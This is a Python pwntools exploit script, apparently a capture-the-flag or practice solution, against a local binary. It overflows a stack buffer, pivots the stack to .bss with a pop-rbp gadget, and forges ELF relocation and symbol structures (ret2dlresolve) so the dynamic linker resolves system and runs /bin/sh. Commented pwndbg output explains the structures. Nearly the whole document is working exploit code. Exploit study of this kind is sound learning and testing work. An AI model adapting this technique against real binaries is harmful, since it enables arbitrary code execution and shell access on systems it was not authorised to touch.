from pwn import *
context.log_level = "debug"
r = gdb.debug("./a.out",gdbscript="""
    b main
        set follow-fork-mode parent
""")

# r = process("./a.out")
"""
	(arbitary via pop rbp;ret)

"""

pop_rbp = 0x40111d          # pop rbp ; ret
addr_pivot_to = 0x404900    # .bss + 0x500

gets_gadget = 0x40113e      # lea    rax,[rbp-0x20]
got_gets = 0x404008         # gets@got.plt

plt_resolve = 0x401020


payload = b'a'*0x28 # bof
payload += p64(pop_rbp)
payload += p64(addr_pivot_to)
payload += p64(gets_gadget)
r.sendline(payload)

payload = b'/bin/sh\x00'
payload += b'a' * 0x18
payload += p64(addr_pivot_to)

"""
calculating fake struct address
and fixing padding for alignment
"""
dynsym = 0x4003d0
dynstr = 0x400448
rela_plt = 0x400500
size_rela_struct = 0x18
size_sym_struct = 0x18

fake_rela_struct = addr_pivot_to + 0x20
pad0 = size_rela_struct - ((fake_rela_struct-rela_plt) % size_rela_struct) # align 0x18 (size)
fake_rela_struct += pad0

fake_sym_struct = fake_rela_struct + size_rela_struct
pad1 = size_sym_struct - ((fake_sym_struct - dynsym) % size_sym_struct) # align 0x18 (size)
fake_sym_struct += pad1

system_str = fake_sym_struct + size_sym_struct

"""
push rela_index
jmp plt_resolve
"""
payload += p64(plt_resolve)
payload += p64(((fake_rela_struct - rela_plt) // size_rela_struct))  # calculated rela_index 
payload += p64(gets_gadget) # return address after dl_resolve
payload += b'\x00' * pad0

sym = (fake_sym_struct - dynsym) // size_sym_struct # calculating ELF64_SYM index
R_X86_64_JUMP_SLOT = 7
payload += p64(got_gets) # r_offset
payload += p64(sym << 32 | R_X86_64_JUMP_SLOT) # r_info
payload += p64(0) # r_addend
payload += b'\x00' * pad1

payload += p32(system_str - dynstr) # st_name (.dynstr offset)
payload += b'\x00' # st_info
payload += b'\x00' # st_other
payload += b'\x00\x00' # st_shndx
payload += p64(0) # st_value
payload += p64(0) # st_size

payload += b'system\x00'

r.sendline(payload)
print(hex(fake_rela_struct), hex(fake_sym_struct))
r.interactive()
"""
*REFERENCE*

typedef struct {                0x400500 rela.plt
    Elf64_Addr r_offset;        0x0000000000404008
    uint64_t   r_info;          0x0000000400000007
    int64_t    r_addend;
} Elf64_Rela;

#define ELF64_R_SYM(r_info)			((r_info) >> 32)         0x0000000400000007 >> 32 -> 4 (ELF64_SYM index)
#define ELF64_R_TYPE(r_info)		((r_info) & 0xffffffff)  0x0000000400000007 & ... -> 7 (R_X86_64_JUMP_SLOT)
#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) << 32) + (type))

(ELF64_SYM index 4)
pwndbg> x/3xg 0x4003d0+(0x18*4)
0x400430:       0x0000001200000006      0x0000000000000000
0x400440:       0x0000000000000000


typedef struct {                0x4003d0 .dynsym
    uint32_t      st_name;      6
    unsigned char st_info;
    unsigned char st_other;
    uint16_t      st_shndx;
    Elf64_Addr    st_value;
    uint64_t      st_size;
} Elf64_Sym;

0x400448    .dynstr
(.dynstr + st_name)
pwndbg> x/s 0x400448+6
0x40044e:       "gets"


"""

